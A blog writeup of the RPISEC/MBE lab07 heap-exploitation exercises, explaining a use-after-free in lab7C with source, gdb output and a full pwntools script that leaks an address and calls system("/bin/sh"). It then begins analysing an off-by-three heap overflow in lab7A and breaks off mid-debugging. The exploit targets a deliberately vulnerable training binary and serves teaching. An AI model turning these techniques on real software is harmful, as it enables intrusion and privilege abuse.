* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_fc99656b_20250119_142600.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [23. February 201820. May 2018](https://devel0pment.de/?p=386) by [scryh](https://devel0pment.de/?author=1)
# RPISEC/MBE: writeup lab07 (Heap Exploitation)

After we have introduced *ASLR* and ways to bypass it in [the last writeup](https://devel0pment.de/?p=378), we will expand our exploits to the *Heap* in this lab.

In this lab there are only two levels:

–> [lab7C](https://devel0pment.de/?p=386#lab7C)

–> [lab7A](https://devel0pment.de/?p=386#lab7A)

---

# lab7C

We can connect to the first level of this lib using the credentials lab7C with the password lab07start:

```

gameadmin@warzone:~$ sudo ssh lab7C@localhost
[sudo] password for gameadmin:
lab7C@localhost's password: (lab07start)
        ____________________.___  _____________________________
        \______   \______   \   |/   _____/\_   _____/\_   ___ \
         |       _/|     ___/   |\_____  \  |    __)_ /    \  \/
         |    |   \|    |   |   |/        \ |        \\     \____
         |____|_  /|____|   |___/_______  //_______  / \______  /
                \/                      \/         \/         \/
 __      __  _____ ____________________________    _______  ___________
/  \    /  \/  _  \\______   \____    /\_____  \   \      \ \_   _____/
\   \/\/   /  /_\  \|       _/ /     /  /   |   \  /   |   \ |    __)_
 \        /    |    \    |   \/     /_ /    |    \/    |    \|        \
  \__/\  /\____|__  /____|_  /_______ \\_______  /\____|__  /_______  /
       \/         \/       \/        \/        \/         \/        \/

        --------------------------------------------------------

                       Challenges are in /levels
                   Passwords are in /home/lab*/.pass
            You can create files or work directories in /tmp

         -----------------[ contact@rpis.ec ]-----------------

Last login: Thu Jan 25 02:00:14 2018 from localhost

```

As usual we have access to the source code:

```

lab7C@warzone:/levels/lab07$ cat lab7C.c
/* compiled with: gcc -z relro -z now -fPIE -pie -fstack-protector-all -o lab7C lab7C.c */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include "utils.h"

#define MAX_STR 6
#define MAX_NUM 6

struct data {
    char reserved[8];
    char buffer[20];
    void (* print)(char *);
};

struct number {
    unsigned int reserved[6];               // implement later
    void (* print)(unsigned int);
    unsigned int num;
};

void small_str(char * a_str)
{
    printf("here's your lame string: %s\n", a_str);
}

void big_str(char * a_str)
{
    printf("nice big str yo: %s\n", a_str);
}

void small_num(unsigned int a_num)
{
    printf("not 1337 enough: %u\n", a_num);
}

void big_num(unsigned int a_num)
{
    printf("tite number dawg: %u\n", a_num);
}

void print_menu()
{
    printf("-- UAF Playground Menu ----------------------\n"
           "1. Make a string\n"
           "2. Make a number\n"
           "3. Delete a string\n"
           "4. Delete a number\n"
           "5. Print a string\n"
           "6. Print a number\n"
           "7. Quit\n"
           "---------------------------------------------\n"
           "Enter Choice: ");
}

/* bugs galore... but no memory corruption! */
int main(int argc, char * argv[])
{
    struct data * strings[MAX_STR] = {0};
    struct number * numbers[MAX_NUM] = {0};
    struct data * tempstr = NULL;
    struct number * tempnum = NULL;

    int strcnt = 0;
    int numcnt = 0;
    unsigned int choice = 0;
    unsigned int index = 0;

    while(1)
    {
        print_menu();

        /* get menu option */
        if((choice = get_unum()) == EOF)
            break;

        /* make a string */
        if(choice == 1)
        {
            if(strcnt < MAX_STR)
            {
                tempstr = malloc(sizeof(struct data));

                /* no memory corruption this time */
                printf("Input string to store: ");
                fgets(tempstr->buffer, 20, stdin);
                tempstr->buffer[strcspn(tempstr->buffer, "\n")] = 0;

                /* pick a print function */
                tempstr->print = strlen(tempstr->buffer) > 10 ? big_str : small_str;

                /* store the string to our master list */
                strings[++strcnt] = tempstr;
                printf("Created new string!\n");
            }
            else
                printf("Please delete a string before trying to make another!\n");
        }

        /* make a number */
        else if(choice == 2)
        {
            if(numcnt < MAX_NUM)
            {
                tempnum = malloc(sizeof(struct number));

                printf("Input number to store: ");
                tempnum->num = get_unum();

                /* pick a print function */
                tempnum->print = tempnum->num > 0x31337 ? big_num : small_num;

                /* store the number to our master list */
                numbers[++numcnt] = tempnum;
                printf("Created new number!\n");
            }
            else
                printf("Please delete a number before trying to make another!\n");
        }

        /* delete a string */
        else if(choice == 3)
        {
            if(strcnt && strings[strcnt])
            {
                free(strings[strcnt--]);
                printf("Deleted most recent string!\n");
            }
            else
                printf("There are no strings left to delete!\n");
        }

        /* delete a number */
        else if(choice == 4)
        {
            if(numcnt && numbers[numcnt])
            {
                free(numbers[numcnt--]);
                printf("Deleted most recent number!\n");
            }
            else
                printf("There are no numbers left to delete!\n");
        }

        /* print a string */
        else if(choice == 5)
        {
            printf("String index to print: ");
            index = get_unum();

            if(index < MAX_STR && strings[index])
                strings[index]->print(strings[index]->buffer);
            else
                printf("There is no string to print!\n");
        }

        /* print a number */
        else if(choice == 6)
        {
            printf("Number index to print: ");
            index = get_unum();

            if(index < MAX_NUM && numbers[index])
                numbers[index]->print(numbers[index]->num);
            else
                printf("There is no number to print!\n");
        }

        /* quit */
        else if(choice == 7)
            break;

        /* base case */
        else
            printf("Invalid choice!\n");

        index = 0;
        choice = 0;
        printf("\n");
    }

    printf("See you tomorrow!\n");
    return EXIT_SUCCESS;
}

```

What does the program do?

–> The binary is compiled with the flags `-pie -fPIE` (line 1), which means that even the memory segments of the binary itself (`.text`, `.plt`, `.got`, …) are randomized.

–> There are two structs: `data` (lines 11-15) and `number` (lines 17-21). We will look at the details shortly.

–> Within the `main` function (line 58) a menu is displayed by calling `print_menu` (line 43) giving the following options:

    – Making a string / number.

    – Deleting a string / number.

    – Printing a string / number.

    – Quitting the program.

–> When `1. Make a string` is selected (line 79), memory is allocated for a `struct data` using `malloc` (line 83).

–> The member `tempstr->buffer` is filled with user input by calling `fgets` (line 87).

–> Depending on the size of the user input the member `tempstr->print` is set to the function `big_str` or `small_str` (line 91).

–> At last the address of the newly created `struct data` is stored in the array `strings` (line 94).

–> When `3. Delete a string` is selected (line 123), the formerly allocated memory is freed by calling `free` (line 127).

–> When `5. Print a string` is selected (line 147), the user can enter an index (line 150) which is used to call the `print` member-function (line 153).

–> Basically the same is done for numbers using the `struct number`.

Where is the vulnerability within the program?

The memory for the instances of both structs (`data` and `number`) is allocated using `malloc` (line 83 and 106). `malloc` returns a pointer to the newly allocated memory, which is stored in the pointer array `strings` / `numbers` (line 94 and 115). When deleting a string or number, the previously allocated memory is released using `free` (line 127 and 139). The one and only argument passed to `free` is a pointer to a formerly allocated memory region. `free` deallocates this memory region so that a subsequent call to `malloc` can use this memory again. One important aspect to notice is that `free` does not change the pointer being passed! This means that the pointer still refers to the now deallocated memory region. Such a pointer is called *Dangling Pointer*. On a subsequent call to `malloc` the memory region the pointer is referring to is allocated again, but possibly not to hold the same type of object as before. If the dangling pointer is now used to read or modify the referred object, there might actually be another type of object within the allocated memory, leading to unintended behaviour. This kind of vulnerability is called *Use After Free*, because the dangling pointer is **use**d to read or modify an object **after** the associated memory has been **free**d.

The vulnerability in this level could have been fixed easily by setting the pointer within the array `strings` / `numbers` to `NULL` after the call to `free`. Because this has not been done, we can print an object even after it has been deleted:

```

lab7C@warzone:/levels/lab07$ ./lab7C
-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 1
Input string to store: AAAA
Created new string!

-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 3
Deleted most recent string!

-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 5
String index to print: 1
here's your lame string: AAAA

```

As this is not so crucial, things are getting worse when we create a new number after we have deleted the string and then try to print the string:

```

...
Enter Choice: 3
Deleted most recent string!

-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 2
Input number to store: 1337
Created new number!

-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 5
String index to print: 1
Segmentation fault (core dumped)

```

`Segmentation fault`! Let’s have a look at the two structs `data` and `number` in order to think about how we can leverage this vulnerability:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_01.png)

The image shows both structs side by side. As we already figured out, a memory region deallocated by `free` is reused by a subsequent call to `malloc`, which means that the former object is overwritten with the new object. So why are we getting a segmentation fault when trying to print the string after it has been overwritten with the `number` struct? We can figured out what caused the segmentation fault using `gdb`:

```

lab7C@warzone:/levels/lab07$ gdb lab7C
Reading symbols from lab7C...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /levels/lab07/lab7C
-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 1
Input string to store: AAAA
Created new string!
...
Enter Choice: 3
Deleted most recent string!
...
Enter Choice: 2
Input number to store: 1337
Created new number!
...
Enter Choice: 5
String index to print: 1

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x539
EBX: 0xb774af98 --> 0x2ea0
ECX: 0xb77168a4 --> 0x0
EDX: 0xb9359010 ("AAAA")
ESI: 0x18
EDI: 0x0
EBP: 0xbfa58a88 --> 0x0
ESP: 0xbfa589fc --> 0xb7749071 (<main+812>:     jmp    0xb77490fb <main+950>)
EIP: 0x539
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x539
[------------------------------------stack-------------------------------------]
0000| 0xbfa589fc --> 0xb7749071 (<main+812>:    jmp    0xb77490fb <main+950>)
0004| 0xbfa58a00 --> 0xb9359010 ("AAAA")
0008| 0xbfa58a04 --> 0xb7749357 --> 0x7243000a ('\n')
0012| 0xbfa58a08 --> 0xb7715c20 --> 0xfbad2288
0016| 0xbfa58a0c --> 0x0
0020| 0xbfa58a10 --> 0x1
0024| 0xbfa58a14 --> 0x0
0028| 0xbfa58a18 --> 0xbfa58b24 --> 0xbfa598d4 ("/levels/lab07/lab7C")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000539 in ?? ()

```

The segmentation fault is caused by an invalid instruction pointer (`eip`) which contains the value `0x539` = `1337`. This is the value we enter as the new number. What happened here?

At first the memory for the string is allocated, which is interpreted as a `struct data`:

```

    struct data * tempstr = NULL;

```
```

                tempstr = malloc(sizeof(struct data));

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_a.png)

Then the user string is stored within the struct and terminated with a null-byte. After this the `print` member function is set to `big_str` / `small_str`:

```

                fgets(tempstr->buffer, 20, stdin);
                tempstr->buffer[strcspn(tempstr->buffer, "\n")] = 0;

```
```

                tempstr->print = strlen(tempstr->buffer) > 10 ? big_str : small_str;

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_b.png)

The pointer to the struct is stored in the array `strings`:

```

                strings[++strcnt] = tempstr;

```

At next we have chosen `3. Delete a string`, which deallocates the memory:

```

                free(strings[strcnt--]);

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_c.png)

As the pointer within `strings` is not changed, it still references the deallocated memory.

After this we created a new number choosing `2. Make a number`. In this case `malloc` is used to allocated memory for a `struct number`:

```

    struct number * tempnum = NULL;

```
```

                tempnum = malloc(sizeof(struct number));

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_d.png)

As shown in the image, the pointer within `strings` still references the memory.

At next the user number is read and the appropriate `print` member-function is set:

```

                tempnum->num = get_unum();

```
```

                tempnum->print = tempnum->num > 0x31337 ? big_num : small_num;

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_e.png)

Finally we selected `5. Print a string` which tries to call the member-function `print` on the `struct data`:

```

                strings[index]->print(strings[index]->buffer);

```

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_02_f.png)

This causes the segmentation fault since `print` does not contain the valid function pointer to `small_str` anymore but the number we just entered.

How do we exploit this vulnerability? As we already figured out, the binary is compiled using the flags `-pie -fPIE`, which means that we do not know even know an address of the binary itself during runtime. If we could leverage the vulnerability to leak a memory address, we could use this address as a reference to calculate the address of a function we would like to call. Since the libc is linked dynamically we can use the function `system` as we did in [lab5C](https://www.devel0pment.de/?p=366#lab5C) (*ret2libc*):

```

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb75ab190 <__libc_system>

```

Summing it up we have to:

(1) Leak a memory-address and calculate address of `__libc_system`

(2) Call `__libc_system` passing the string `"/bin/sh"`

## (1) leak memory-address

We basically have two possibilities to use our discovered *Use After Free* vulnerability:

–> We can treat a `struct number` as a `struct data`.

–> We can treat a `struct data` as a `struct number`.

The function-pointers within the structs are essential. The `print` member-function of `struct number` takes an unsigned integer argument which is being printed. The function is called passing the member variable `num`:

```

                numbers[index]->print(numbers[index]->num);

```

When we inspect both structs side by side again, we can see that `num` within `struct num` resides at the same offset as `print` within `struct data`:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_03.png)

We can leverage this by starting to create a number:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_04_a.png)

The member-function `print` is now set to the address of `small_num`.

We directly delete this number again and create a string. As input we enter `"/bin/sh"`, which we will use later. You might already guess what we will use this for 😉

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_04_b.png)

Now the memory is already set up to leak the address of `small_str`! We just have to call `print` on the dangling pointer to `struct number`:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_04_c.png)

As you can see in the image, the member `num` has been overwritten with the address of `small_str`, which will be printed if we choose `6. Print a number`.

```

lab7C@warzone:/levels/lab07$ ./lab7C
-- UAF Playground Menu ----------------------
1. Make a string
2. Make a number
3. Delete a string
4. Delete a number
5. Print a string
6. Print a number
7. Quit
---------------------------------------------
Enter Choice: 2
Input number to store: 1337
Created new number!
...
Enter Choice: 4
Deleted most recent number!
...
Enter Choice: 1
Input string to store: /bin/sh
Created new string!
...
Enter Choice: 6
Number index to print: 1
not 1337 enough: 3077868487

```

With the leaked memory address we can easily calculate the address of `__libc_system`:

```

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb75ab190 <__libc_system>
gdb-peda$ p small_str
$2 = {<text variable, no debug info>} 0xb7748bc7 <small_str>
gdb-peda$ p small_str - system
$3 = 0x19da37

```

Thus we have to subtract `0x19da37` from the leaked address of `small_str` to get the address of `__libc_system`.

## (2) calling \_\_libc\_system

As we have the address of `__libc_system` now, we just need to call it passing the string `"/bin/sh"` as argument. Luckily we already stored `"/bin/sh"` in the member variable `buffer`. This means that we just have to put the address of `__libc_system` in the right place. We do this by deleting the previously create string again and create a number entering the address of `__libc_system`:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_04_d.png)

The only thing left to do is to call the `print` function of `struct data` using the dangling pointer:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7C_04_e.png)

The function `__libc_system` gets called passing the member variable `buffer`, which contains the string `"/bin/sh"`.

The following python-script does all this steps and calculates the address of `__libc_system`:

```

lab7C@warzone:/levels/lab07$ cat /tmp/exploit_lab7C.py
from pwn import *

p = process("./lab7C")

# *******************************************************
# step 1: leak memory-address

p.recvuntil("Enter Choice: ")
p.sendline("2")                # 2. Make a number
p.sendline("1337")             #    --> 1337
p.recvuntil("Enter Choice: ")
p.sendline("4")                # 4. Delete a number
p.recvuntil("Enter Choice: ")
p.sendline("1")                # 1. Make a string
p.sendline("/bin/sh")          #    --> "/bin/sh"
p.recvuntil("Enter Choice: ")
p.sendline("6")                # 6. Print a number
p.sendline("1")                #    --> index = 1

# --> output contains address of small_str
ret = p.recvuntil("Enter Choice: ")
addr_small_str = int(ret[ret.index("enough: ")+8:ret.index("\n")], 10)
log.info("addr_small_str: " + hex(addr_small_str))

# --> calculate actutal address of system
addr_system = addr_small_str - 0x19da37

# *******************************************************
# step 2: call system("/bin/sh")

p.sendline("3")               # 3. Delete a string
p.recvuntil("Enter Choice: ")
p.sendline("2")               # 2. Make a number
p.sendline(str(addr_system))  #    --> address of system
p.recvuntil("Enter Choice: ")
p.sendline("5")               # 5. Print a string
p.sendline("1")               #    --> index = 1
p.recv(100)

p.interactive()

```

Running the script:

```

lab7C@warzone:/levels/lab07$ python /tmp/exploit_lab7C.py
[+] Starting program './lab7C': Done
[*] addr_small_str: 0xb7710bc7
[*] Switching to interactive mode
$ whoami
lab7A
$ cat /home/lab7A/.pass
us3_4ft3r_fr33s_4re_s1ck

```

Done 🙂 The password for level A is `us3_4ft3r_fr33s_4re_s1ck`.

---

# lab7A

We can connect to the level using the previously achieved credentials lab7A with the password us3\_4ft3r\_fr33s\_4re\_s1ck:

```

gameadmin@warzone:~$ sudo ssh lab7A@localhost
[sudo] password for gameadmin:
lab7A@localhost's password: (us3_4ft3r_fr33s_4re_s1ck)
        ____________________.___  _____________________________
        \______   \______   \   |/   _____/\_   _____/\_   ___ \
         |       _/|     ___/   |\_____  \  |    __)_ /    \  \/
         |    |   \|    |   |   |/        \ |        \\     \____
         |____|_  /|____|   |___/_______  //_______  / \______  /
                \/                      \/         \/         \/
 __      __  _____ ____________________________    _______  ___________
/  \    /  \/  _  \\______   \____    /\_____  \   \      \ \_   _____/
\   \/\/   /  /_\  \|       _/ /     /  /   |   \  /   |   \ |    __)_
 \        /    |    \    |   \/     /_ /    |    \/    |    \|        \
  \__/\  /\____|__  /____|_  /_______ \\_______  /\____|__  /_______  /
       \/         \/       \/        \/        \/         \/        \/

        --------------------------------------------------------

                       Challenges are in /levels
                   Passwords are in /home/lab*/.pass
            You can create files or work directories in /tmp

         -----------------[ contact@rpis.ec ]-----------------

Last login: Mon Jan 22 05:48:49 2018 from localhost

```

Let’s have a look at the source code:

```

lab7A@warzone:/levels/lab07$ cat lab7A.c
/* compiled with: gcc -static -z relro -z now -fstack-protector-all -o lab7A lab7A.c */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

#define MAX_MSG    10
#define MAX_BLOCKS 32
#define BLOCK_SIZE 4

struct msg {
    void (* print_msg)(struct msg *);
    unsigned int xor_pad[MAX_BLOCKS];
    unsigned int message[MAX_BLOCKS];
    unsigned int msg_len;
};

struct msg * messages[MAX_MSG];

/* apply one time pad */
void encdec_message(unsigned int * message, unsigned int * xor_pad)
{
    int i = 0;
    for(i = 0; i < MAX_BLOCKS; i++)
        message[i] ^= xor_pad[i];
}

/* print information about the given message */
void print_message(struct msg * to_print)
{
    unsigned int i = 0;
    char * xor_pad;
    char * message;

    xor_pad = (char *)&to_print->xor_pad;
    message = (char *)&to_print->message;

    /* print the message's xor pad */
    printf("\nXOR Pad: \n"
           "-----------------------------------------\n");

    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)
    {
        printf("%02x", xor_pad[i] & 0xFF);
        if(i % 32 == 31)
            puts("");
    }

    /* print encrypted message */
    printf("\nEncrypted Message: \n"
           "-----------------------------------------\n");

    for(i = 0; i < BLOCK_SIZE*MAX_BLOCKS; i++)
    {
        printf("%02x", message[i] & 0xFF);
        if(i % 32 == 31)
            puts("");
    }

    puts("");
}

/* creates a message */
int create_message()
{
    int i, j;
    struct msg * new_msg = NULL;

    /* find a free message slot */
    for(i = 0; i < MAX_MSG; i++)
        if(messages[i] == NULL)
            break;

    /* make sure we actually found an empty slot */
    if(messages[i])
    {
        printf("-No message slots left!\n");
        return 1;
    }

    printf("-Using message slot #%u\n", i);

    /* initialize new message */
    new_msg = malloc(sizeof(struct msg));
    memset(new_msg, 0, sizeof(struct msg));
    new_msg->print_msg = &print_message;

    for(j = 0; j < MAX_BLOCKS; j++)
        new_msg->xor_pad[j] = rand();

    /* get the length of data the user intends to encrypt */
    printf("-Enter data length: ");

    new_msg->msg_len = get_unum();

    if(new_msg->msg_len == 0)
    {
        printf("-Message length must be greater than zero!\n");
        free(new_msg);
        return 1;
    }

    /* make sure the message length is no bigger than the xor pad */
    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;

    /* read in the message to encrypt with the xor pad */
    printf("-Enter data to encrypt: ");
    read(0, &new_msg->message, new_msg->msg_len);

    /* encrypt message */
    encdec_message(new_msg->message, new_msg->xor_pad);

    /* save the new message to the global list */
    messages[i] = new_msg;

    return 0;
}

int edit_message()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to destroy */
    printf("-Input message index to edit: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    printf("-Input new message to encrypt: ");

    /* clear old message, and read in a new one */
    memset(&messages[i]->message, 0, BLOCK_SIZE * MAX_BLOCKS);
    read(0, &messages[i]->message, messages[i]->msg_len);

    /* encrypt message */
    encdec_message(messages[i]->message, messages[i]->xor_pad);

    return 0;
}

/* free a secure message */
int destroy_message()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to destroy */
    printf("-Input message index to destroy: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* destroy message */
    memset(messages[i], 0, sizeof(struct msg));
    free(messages[i]);
    messages[i] = NULL;

    return 0;
}

/* print a message at a select index */
int print_index()
{
    char numbuf[32];
    unsigned int i = 0;

    /* get message index to print */
    printf("-Input message index to print: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* print the message of interest */
    messages[i]->print_msg(messages[i]);

    return 0;
}

/* the vulnerability is in here */
void print_menu()
{
    printf("+---------------------------------------+\n"
           "|        Doom's OTP Service v1.0        |\n"
           "+---------------------------------------+\n"
           "|------------ Services Menu ------------|\n"
           "|---------------------------------------|\n"
           "| 1. Create secure message              |\n"
           "| 2. Edit secure message                |\n"
           "| 3. Destroy secure message             |\n"
           "| 4. Print message details              |\n"
           "| 5. Quit                               |\n"
           "+---------------------------------------+\n");
}

int main()
{
    int choice = 0;
    srand(time(NULL));
    disable_buffering(stdout);

    while(1)
    {
        print_menu();

        /* get menu option */
        printf("Enter Choice: ");
        choice = get_unum();

        printf("-----------------------------------------\n");

        /* handle menu selection */
        if(choice == 1)
        {
            if(create_message())
                printf("-Failed to create message!\n");
            else
                printf("-Message created successfully!\n");
        }
        else if(choice == 2)
        {
            if(edit_message())
                printf("-Failed to edit message!\n");
            else
                printf("-Message has been successfully modified!\n");
        }
        else if(choice == 3)
        {
            if(destroy_message())
                printf("-Failed to destroy message!\n");
            else
                printf("-Message destroyed!\n");
        }
        else if(choice == 4)
        {
            if(print_index())
                printf("-Failed to print message!\n");
        }
        else if(choice == 5)
        {
            break;  // exit
        }
        else
            printf("-Invalid choice!\n");

        choice = 0;
        puts("");
    }

    printf("See you tomorrow!\n");
    return EXIT_SUCCESS;
}

```

What does the program do?

–> The binary is compiled with the flag `-static` (line 1). This means that the binary has all required functions built in.

–> A struct named `msg` is defined (lines 16-21) which contains a function-pointer (`print_msg`), two unsigned integer arrays (`xor_pad` and `message`) and a single unsigned integer member (`msg_len`).

–> There is a global array (`messages`) defined to contain pointers to `struct msg` instances (line 23).

–> Within the `main` function (line 217) a menu is displayed by calling `print_menu` (line 202) giving the following options:

    – Creating / Editing / Destroying secure message.

    – Printing message details.

    – Quitting the program.

–> When `1. Create secure message` is selected, the function `create_message` is called (line 236).

    – `create_message` (line 69) searches for an empty slot in `messages` and allocates memory for a new message (line 89).

    – The member-function `print_msg` is set to the address of the function `print_message` (line 91).

    – The array `new_msg->xor_pad` is initialized with random values (lines 93-94).

    – `new_msg->msg_len` is set by reading a value from the user (line 99).

    – If `new_msg->msg_len` is too big, it is set to the maximum amount of bytes which can be stored in `new_msg->message` (lines 109-110).

    – The function `read` is used to read a user input from `stdin` to `new_msg->message` (line 114).

    – This messages is encrypted by calling `encdec_message` (line 117).

    – At last the address of the newly created object `new_msg` is stored in the global array `messages` (line 120).

–> When selecting `2. Edit secure message`, the function `edit_message` is called (line 243).

    – `edit_message` (line 125) reads an index, zeroes out the `message` member variable and reads in a maximum amount of `msg_len` bytes as a new message (lines 132, 144-145).

    – At last the new message is again encrypted using `encdec_message` (line 148).

–> By choosing `3. Destroy secure message` the function `destroy_message` is called (line 250).

    – `destroy_message` (line 154) also reads an index and zeros out the `message` member variable (lines 161, 171).

    – After this the memory for the `struct msg` is deallocated using `free` (line 172).

    – The struct pointer within the global array `messages` is then set to `NULL` (line 173).

–> When `4. Print message details` is selected, the function `print_index` is called (line 257).

    – `print_index` (line 179) yet again reads an index (line 186).

    – If the index is valid, the `print_msg` member-function is called passing the whole struct (line 196).

    – As the `print_msg` member-function is initialized with `print_message`, this function gets called.

    – `print_message` (line 34) prints the XOR pad and the encrypted message.

–> `5. Quit` breaks out of the loop (line 262) und thus quits the program.

There is also an additional readme file stating that this is a remote challenge much like in [lab6B](https://www.devel0pment.de/?p=378#lab6B):

```

lab7A@warzone:/levels/lab07$ cat lab7A.readme
lab7A is a remote level much like lab6B. It is running on port 7741.

nc wargame.server.example 7741 -vvv

```

Where is the vulnerability within the program?

This question took me a time. While it has been very easy to spot the vulnerabilities in the first labs, it was quite hard to discover the vulnerability within the code above. After trying around a little bit with the program, I figured out that when choosing a `msg_len` so that `128 < msg_len < 132` the value will not be reset to the maximum amount of `128`. The following lines of code are causing this behaviour:

```

    if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
        new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;

```

`msg_len` is an unsigned integer and the macro `BLOCK_SIZE` is also an integer (`4`). This means that the division within the if-statement is in whole numbers:

```

>>> 127/4
31
>>> 128/4
32
>>> 129/4
32
>>> 130/4
32
>>> 131/4
32
>>> 132/4
33

```

As the remains are not taken into account, the if-condition evaluates to `true` only when `msg_len` is bigger than `131`. This means that we can overflow the member variable `message` by 3 bytes! And what resides within the memory after `message`? Exactly! `msg_len`. Thus we can set `msg_len` do an even bigger number and than use `edit_message` to overflow `message` by a lot of more bytes than just 3 possibly overwriting the next chunk on the heap.

Fortunately the binary is not compiled as position independent code. Thus we know the address of the global array `messages` which holds the heap pointers:

```

[0x08048d2a]> is~messages
vaddr=0x080eef60 paddr=0x000a6f60 ord=1841 fwd=NONE sz=40 bind=GLOBAL type=OBJECT name=messages

```

Now let’s try to overflow `message` inspecting the heap using `gdb`:

```

lab7A@warzone:/levels/lab07$ gdb ./lab7A
Reading symbols from ./lab7A...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /levels/lab07/lab7A
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 1
-----------------------------------------
-Using message slot #0
-Enter data length: 131
-Enter data to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Message created successfully!

+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: ^C
Program received signal SIGINT, Interrupt.
...
gdb-peda$ x/x 0x080eef60
0x80eef60 <messages>:   0x080f19d8
gdb-peda$ x/80xw 0x080f19d8-8
0x80f19d0:      0x00000000      0x00000111      0x08048fd3      0x078d572f
